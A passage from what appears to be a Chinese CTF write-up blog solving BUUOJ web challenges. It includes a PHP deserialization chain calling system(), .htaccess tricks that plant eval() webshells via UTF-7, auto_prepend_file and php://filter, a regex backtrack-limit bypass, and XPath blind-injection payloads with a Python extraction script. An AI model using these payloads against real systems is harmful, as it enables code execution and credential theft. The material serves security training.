<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);                </span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在该方法中直接将serialize 赋值为system ,进行命令执行</p>
<p><strong>本地测试如下：</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu45.jpg"></p>
<p>发现思路是正确的</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;`cat /flag &gt; ./uploads/flag.php`&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    ];	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A()));</span><br></pre></td></tr></table></figure>
<p>看了大佬的wp发现还有一种做法是</p>
<p>先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行</p>
<p>参考链接：<a href="https://guokeya.github.io/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/" target="_blank">新年红包题1</a></p>
<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>.htaccess配置</strong></li>
<li>php.ini </li>
<li><strong>\n</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码量较少，主要走了如下的限制</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">删除当前目录除了<span class="meta">index</span>.php以外所有文件 </span><br><span class="line">包含fl3g.php，访问后可以发现此文件不存在 </span><br><span class="line">content经过stristr不能含有<span class="meta">on</span>, html, type, flag, upload, <span class="meta">file</span></span><br><span class="line"><span class="meta">filename</span>经过preg_match只能含有[a-z.] </span><br><span class="line">删除当前目录除了<span class="meta">index</span>.php以外所有文件 </span><br><span class="line">写入内容为content名为<span class="meta">filename</span>的文件 ,最后还会有\n换行追加数据导致.htaccess解析错误的限制 </span><br></pre></td></tr></table></figure>
<p>而且这里比较让我们值得注意的是<code>fl3g.php</code>的包含，虽然每次都会首先执行删除当前目录下所有的文件，但是之后又都会去尝试包含<code>fl3g.php</code>，那我们是不是可以有什么操作去写入<code>fl3g.php</code>呢？</p>
<p>我们把写入文件的功能点放在<code>.htaccess</code>上来</p>
<p><strong>通过查看php.ini 配置文档，发现几个可利用的地方</strong></p>
<ul>
<li><strong><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件</strong></li>
<li><strong><code>include_path</code>可以指定<code>include</code>等包含函数包含的环境路径</strong></li>
</ul>
<p><strong>我们大概可以有这么个思路：</strong></p>
<p>error_log可以将php运行报错的记录写到指定文件中。</p>
<p>我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，这个时候，include_path也就是我们的payload就会写入到我们刚刚设置报错信息的error_log =  /tmp/fl3g.php文件中去。这个时候我们再将include_path的内容设置成/tmp,即可让index.php能够包含<code>/tmp/fl3g.php</code>,即读取我们的报错信息</p>
<p><strong>首先先考虑如何绕过\n换行追加数据导致.htaccess解析错误的限制</strong> </p>
<p><strong>我们可以利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要把<code>\n</code>进行“吃”掉。那么最常见的操作就是利用<code>\</code>斜杠将其转义了，这样<code>\\n</code>就是一个简单的<code>\n</code>字符串了。</strong></p>
<p>初步构造.htaccess文件内容如下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">&quot;payload&quot;</span> </span><br><span class="line">php_value error_log <span class="regexp">/tmp/</span>fl3g.php</span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>


<p><strong>不过令人失望的是 error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload，因为&lt; &gt;等会被转义，我们需要绕过，这里利用UTF-7绕过</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu46.jpg"></p>
<p>先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">php_value</span> include_path &#x27;+ADw?php die(eval($_GET[<span class="number">2</span>]))+ADs +AF<span class="number">8</span>AXw-halt+AF<span class="number">8</span>-compiler()+ADs&#x27;</span><br><span class="line"><span class="attribute">php_value</span> error_log /tmp/fl<span class="number">3</span>g.php</span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>
<p>payload1：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?filename=.htaccess&amp;content=php_value+error_log+%<span class="number">2</span>ftmp%<span class="number">2</span>ffl<span class="number">3</span>g.php%<span class="number">0</span>aphp_value+include_path+%<span class="number">22</span>%<span class="number">2</span>bADw%<span class="number">3</span>fphp+eval(%<span class="number">24</span>_GET%<span class="number">5</span>b<span class="number">1</span>%<span class="number">5</span>d)%<span class="number">2</span>bADs+%<span class="number">2</span>bAF<span class="number">8</span>AXw-halt%<span class="number">2</span>bAF<span class="number">8</span>-compiler()%<span class="number">2</span>bADs%<span class="number">22</span>%<span class="number">0</span>a%<span class="number">23</span>+%<span class="number">5</span>c</span><br></pre></td></tr></table></figure>
<p>上传之后，来到<a href="http://url/index.php,%E4%BD%BF%E5%BE%97%E8%A7%A6%E5%8F%91%60.htaccess%60%EF%BC%8C%E5%B0%86%60.htaccess%60%E4%B8%AD%E7%9A%84%60payload%60%E5%86%99%E9%81%93%60/tmp/fl3g.php%60%E4%B8%AD%E3%80%82">http://url/index.php,使得触发`.htaccess`，将`.htaccess`中的`payload`写道`/tmp/fl3g.php`中。</a></p>
<p>第二步 再把以下内容写入<code>.htaccess</code>：，从而显示报错信息</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">&#x27;/tmp&#x27;</span></span><br><span class="line">php_value zend.<span class="keyword">multibyte </span><span class="number">1</span></span><br><span class="line">php_value zend.<span class="keyword">script_encoding </span><span class="string">&quot;UTF-7&quot;</span></span><br><span class="line"><span class="comment">#\</span></span><br></pre></td></tr></table></figure>
<p>payload2：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?filename=.htaccess&amp;content=php_value+include_path+%<span class="number">22</span>%<span class="number">2</span>ftmp%<span class="number">22</span>%<span class="number">0</span>aphp_value+zend.multibyte+<span class="number">1</span>%<span class="number">0</span>aphp_value+zend.script_encoding+%<span class="number">22</span>UTF-<span class="number">7</span>%<span class="number">22</span>%<span class="number">0</span>a%<span class="number">23</span>+%<span class="number">5</span>c</span><br></pre></td></tr></table></figure>
<p>上传后，直接修改url为<a href="http://url/?1=var_dump(file_get_contents(&#39;/flag&#39;)">http://url/?1=var_dump(file_get_contents(&#39;/flag&#39;)</a>);</p>
<p>即可看到报错信息</p>
<p>还有一种解法是</p>
<p><strong>用<code>\</code>来转义换行符来绕过最后加一行的限制。 所以同理也可以用<code>\</code>来绕过stristr处的所有限制。型如</strong></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line"><span class="keyword">le</span> <span class="string">&quot;.htaccess&quot;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_fil\%<span class="number">0</span>ae%<span class="number">20.</span>htaccess%<span class="number">0</span>a%<span class="number">23</span><span class="meta">&lt;?php</span>%<span class="number">20</span>system(<span class="string">&#x27;cat%20/fl[a]g&#x27;</span>);<span class="meta">?&gt;</span>\</span><br></pre></td></tr></table></figure>


<p>解法三：</p>
<p>手册中还允许设置 <a href="https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> ，这个可以更改正则回溯的次数，具体可以参考 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<p>这里我们看到题目的代码正则部分是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hacker2&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <strong>这里是判断是否为 1 ，如果为 1 则 die ，而根据正则回溯，当超过回溯次数，<code>preg_match</code>会返回<code>false</code>，自然就可以绕过了。</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">php_value</span> pcre.backtrack_limit <span class="number">0</span></span><br><span class="line"><span class="attribute">php_value</span> pcre.jit <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>所以我们可以先上传以上内容到<code>.htaccess</code>，利用这个回溯特性可以绕过 filename 的检测</strong></p>
<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?content<span class="operator">=</span>php_value<span class="variable">%20</span>pcre.backtrack_limit<span class="variable">%200</span><span class="variable">%0</span>aphp_value<span class="variable">%20</span>pcre.jit<span class="variable">%200</span><span class="variable">%0</span>a<span class="variable">%23</span>\&amp;filename<span class="operator">=</span>.htaccess</span><br></pre></td></tr></table></figure>


<p>没有preg_match的waf后就可以通过php://filter伪协议写入一句话  </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;<span class="number">1</span>=phpinfo(); </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>知识点：这一题的话就是找注入点要细心，抓包，F12看Network等等，js文件要注意</p>
<p>找到注入点后sqlmap 一把梭</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu47.jpg"></p>
<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>知识点：<strong>XPATH注入</strong></p>
<p><a href="https://xz.aliyun.com/t/7791#toc-0" target="_blank">XPATH注入学习</a></p>
<p><strong>Xpath注入漏洞验证：</strong></p>
<p>加一个 ‘ ;有下列报错，则可以确定Xpath注入的存在性</p>
<p>xpath盲注适用于攻击者不清楚XML文档的架构，没有错误信息返回，一次只能通过布尔化查询来获取部分信息，同样以0x05中的源码为例</p>
<p><strong>Xpath盲注步骤：</strong></p>
<ul>
<li><strong>判断根节点下的节点数</strong></li>
<li><strong>判断根节点下节点长度&amp;名称</strong></li>
<li><strong>…..</strong></li>
<li><strong>重复猜解完所有节点，获取最后的值</strong></li>
</ul>
<p><strong>从根节点开始判断：</strong></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/)=1  or &#x27;</span><span class="string">&#x27;=&#x27;</span>     ###根节点数量为<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or count(/*)=1 or &#x27;</span><span class="string">&#x27;=&#x27;</span>   ##根节点下只有一个子节点</span><br></pre></td></tr></table></figure>
<p><strong>判断根节点下的节点长度为8：</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="keyword">or</span> <span class="built_in">string</span>-<span class="built_in">length</span>(<span class="built_in">name</span>(/*[<span class="number">1</span>]))=<span class="number">8</span> <span class="keyword">or</span> &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>猜解根节点下的节点名称：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span><span class="keyword">a</span><span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>c<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">..</span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 8, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>猜解出该节点名称为accounts</strong></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;or count(/accounts)=1  or &#x27;&#x27;=&#x27;   /accounts节点数量为<span class="number">1</span></span><br><span class="line">&#x27;or count(/accounts/user/*)&gt;0 or &#x27;&#x27;=&#x27;     /accounts下有两个节点</span><br><span class="line"></span><br><span class="line">&#x27;or string-length(name(/accounts/*[1]))=4  or &#x27;&#x27;=&#x27;    第一个子节点长度为<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>猜解accounts下的节点名称：</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 1, 1)=&#x27;</span><span class="string">u&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 4, 1)=&#x27;</span><span class="string">r&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>accounts下子节点名称为user</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/accounts/user)=2  or &#x27;</span><span class="string">&#x27;=&#x27;</span>    <span class="keyword">user</span>节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为<span class="keyword">user</span>节点</span><br></pre></td></tr></table></figure>
<p><strong>第一个user节点的子节点长度为8：</strong><br>*<em>‘or string-length(name(/accounts/user[position()=1]/</em>[1]))=8 or ‘’=’**</p>
<p><strong>读取user节点的下子节点</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#x27;</span><span class="string">u&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>最终所有子节点值验证如下：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1)=&#x27;</span>usernam<span class="string">e&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="string">&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[3]), 1)=&#x27;</span>accounttyp<span class="string">e&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[4]), 1)=&#x27;</span><span class="keyword">password</span><span class="string">&#x27;  or &#x27;&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>继续猜解：</strong></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;or count(/accounts/user[position()=1]/username/*)&gt;0 or &#x27;&#x27;=&#x27;   </span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/email/*)&gt;0 or &#x27;&#x27;=&#x27; </span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/accounttype/*)&gt;0 or &#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/username/password/*)&gt;0 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>均为 false，不再有子节点，则可以尝试读取这些节点的值</strong></p>
<p><strong>第一个user下的username值长度为6:</strong></p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="keyword">or</span> <span class="built_in">string</span>-<span class="built_in">length</span>((//user[<span class="built_in">position</span>()=<span class="number">1</span>]/username[<span class="built_in">position</span>()=<span class="number">1</span>]))=<span class="number">6</span>  <span class="keyword">or</span> &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>读取第一个user下usernaem的值</strong></p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>T<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="params">...</span>.</span><br><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),6,1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</strong></p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or string-length((//user[position()=2]/username[position()=1]))=4 or &#x27;</span><span class="string">&#x27;=&#x27;</span>  第一个user下的username长度为<span class="number">4</span></span><br><span class="line"><span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
<p><strong>重复上边步骤即可</strong></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://821c8f01-96e1-4a71-9954-1f22c9e87c88.node3.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload_1 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        payload_2 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        payload_3 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        payload_4 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#整合payload</span></span><br><span class="line">        payload = payload_password</span><br><span class="line"></span><br><span class="line">        print(payload)</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;非法操作&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;用户名&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>


<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>知识点：反序列化链构造</p>
